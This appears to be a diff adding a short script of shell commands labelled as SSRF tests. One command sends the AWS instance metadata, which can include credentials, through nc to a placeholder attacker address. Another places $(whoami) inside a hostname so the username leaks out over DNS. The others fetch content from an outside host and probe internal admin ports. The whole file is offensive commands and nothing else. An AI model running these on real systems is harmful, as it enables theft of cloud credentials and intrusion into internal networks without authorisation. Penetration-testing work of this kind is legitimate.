@@ -1,0 +1,11 @@
+# Test 1: Basic Fetch + Echo
+curl -s https://norosec.xyz/ssrf-echo.txt | tee /tmp/ssrf-test
+
+# Test 2: Metadata Exfil (AWS/EC2)
+curl -s http://169.254.169.254/latest/meta-data/ | nc YOUR_IP 4444
+
+# Test 3: Blind SSRF (DNS/Log4Shell)
+curl http://$(whoami).YOUR_DOMAIN.com/
+
+# Test 4: Internal Pivot
+curl -s http://localhost:8080/admin || curl http://127.0.0.1:80/
